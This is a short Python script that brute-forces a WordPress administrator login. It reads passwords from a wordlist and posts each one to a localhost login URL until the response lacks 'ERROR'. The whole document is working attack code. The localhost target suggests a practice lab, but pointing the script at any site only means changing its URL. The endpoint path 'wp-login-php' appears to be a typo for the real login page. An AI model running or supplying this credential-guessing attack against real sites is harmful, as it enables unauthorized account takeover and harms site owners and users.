import requests

passfile = ""

with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying = requests.post("https://localhost/wp-login-php", data={"log":"admin", "pwd":word})

        if "ERROR" not in trying.text:
            print("Success, the password is: "+ word)
            break
        else:
            print("Incorrect password: " + word)
